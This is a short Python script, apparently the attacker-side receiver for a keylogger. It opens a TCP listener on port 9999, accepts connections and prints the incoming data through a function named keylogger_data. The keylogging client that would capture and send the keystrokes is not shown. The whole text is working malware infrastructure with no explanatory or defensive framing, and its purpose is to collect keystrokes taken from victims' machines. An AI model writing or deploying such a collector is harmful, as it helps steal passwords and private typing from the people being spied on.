import socket
import threading

def keylogger_data(conn):
    while True:
        data=conn.recv(10)
        if not data:
            break
        print(data.decode('utf-8'),end='')
    conn.close()

host=''
port =9999
s=socket.socket()
s.bind((host,port))
s.listen(0)
while True:
    conn,addr=s.accept()
    t=threading.Thread(target=keylogger_data,args=(conn,),daemon=True)
    t.start()
    t.join()